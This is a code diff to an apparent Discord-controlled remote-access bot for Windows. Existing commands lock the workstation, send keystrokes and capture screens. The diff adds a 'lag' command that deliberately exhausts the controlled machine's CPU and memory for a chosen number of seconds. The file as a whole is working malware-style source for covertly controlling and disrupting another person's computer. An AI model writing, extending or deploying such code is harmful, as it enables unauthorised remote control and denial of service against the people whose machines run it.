@@ -17,6 +17,8 @@ from tkinter import messagebox
 from threading import Thread
 from tkvideo import tkvideo
 from PIL import ImageGrab, Image, ImageTk
+import time
+import threading
 
 # Load token from .env
 load_dotenv()
@@ -196,6 +198,41 @@ class MyClient(discord.Client):
                 if message.content == 'lock':
                     os.system("rundll32.exe user32.dll,LockWorkStation")
                     await message.channel.send('Screen Locked')
+                
+                if startswith := message.content.startswith('lag'):
+                    try:
+                        _, seconds = message.content.split()
+                        seconds = int(seconds)
+                        await message.channel.send(f'Lagging for {seconds} seconds...')
+                        #lag the system by using up ram and cpu for the duration
+                        def lag_system(duration):
+                            
+
+                            def cpu_stress():
+                                end_time = time.time() + duration
+                                while time.time() < end_time:
+                                    pass
+
+                            def memory_stress():
+                                a = []
+                                end_time = time.time() + duration
+                                while time.time() < end_time:
+                                    a.append(' ' * 10**6)  # Allocate 1MB chunks
+
+                            cpu_thread = threading.Thread(target=cpu_stress)
+                            memory_thread = threading.Thread(target=memory_stress)
+
+                            cpu_thread.start()
+                            memory_thread.start()
+
+                            cpu_thread.join()
+                            memory_thread.join()
+                            
+                        lag_system(seconds)
+                        
+                        await message.channel.send('Lag complete.')
+                    except ValueError:
+                        await message.channel.send('Invalid command format. Use "Lag <seconds>".')
 
                 # key - Send keystrokes
                 if message.content == 'key':
